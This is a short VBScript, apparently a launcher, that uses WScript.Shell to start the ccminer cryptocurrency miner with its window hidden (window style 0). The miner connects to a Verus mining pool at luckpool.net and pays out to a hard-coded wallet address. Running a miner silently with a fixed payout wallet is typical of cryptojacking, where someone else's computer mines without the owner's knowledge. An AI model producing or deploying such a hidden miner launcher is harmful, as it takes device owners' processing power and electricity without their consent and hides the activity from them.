Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.kuyrai -p x -t 2", 0
Set WshShell = Nothing